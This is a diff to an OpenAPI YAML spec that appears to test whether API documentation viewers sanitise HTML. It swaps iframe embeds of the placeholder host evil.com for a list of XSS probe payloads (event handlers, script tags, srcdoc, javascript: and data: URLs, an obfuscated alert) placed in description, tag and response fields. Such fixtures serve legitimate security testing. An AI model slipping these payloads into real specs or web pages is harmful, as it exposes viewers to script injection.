@@ -1,20 +1,42 @@
 openapi: 3.0.3
 info:
-  title: Swagger iframe Injection Test
-  version: "1.0.1"
+  title: Advanced HTML XSS Payloads
+  version: "2.0.0"
   description: |
-    <iframe src="https://evil.com"></iframe>
+    <img src=x onerror=alert('img')>
+    <svg onload=alert('svg1')>
+    <svg><script>alert('svg2')</script>
+    <iframe srcdoc="<script>alert('srcdoc')</script>"></iframe>
+    <math><mtext></mtext><script>alert('math')</script></math>
+    <form><button formaction="javascript:alert('form')">click</button></form>
+    <input onfocus=alert('focus') autofocus>
+    <details ontoggle=alert('toggle') open>toggle</details>
+    <a href="javascript:alert('href')">clickme</a>
+    <object data="data:text/html,<script>alert('object')</script>"></object>
+    <video><source onerror="alert('video')"></video>
+    <marquee onstart=alert('marquee')>marquee</marquee>
+    <b onmouseover=alert('b')>mouseover</b>
+    <img src='x' onerror=prompt(document.domain)>
+    <iframe srcdoc='<img src=x onerror=alert(`iframe-bypass`)>'>
+    <div style="width:100px" onclick="window['al'+'ert']('concat')">click</div>
+    <img srcset="x 1x, data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert('srcset')</script></svg> 2x">
 tags:
-  - name: iframe-injection
+  - name: xss-advanced
     description: |
-      <iframe src="https://evil.com"></iframe>
+      <img src=x onerror=alert('tag-desc')>
+      <iframe srcdoc="<svg/onload=alert('iframe-tag')>"></iframe>
 paths:
-  /iframe:
+  /xss-test:
     get:
-      summary: "Test iframe injection endpoint"
+      summary: "Test endpoint for XSS"
       description: |
-        <iframe src="https://evil.com"></iframe>
+        <object data="data:text/html,<script>alert('endpoint')</script>"></object>
+        <details open ontoggle=alert('endpoint-toggle')>details</details>
+        <img src onerror=alert('endpoint-img')>
       responses:
         "200":
           description: |
-            <iframe src="https://evil.com"></iframe>
+            <iframe srcdoc="<input autofocus onfocus=alert('resp')>"></iframe>
+            <svg/onload=alert('resp-svg')>
+            <math><mtext></mtext><script>alert('resp-math')</script></math>
+            <img src=x onerror=alert('resp-img')>
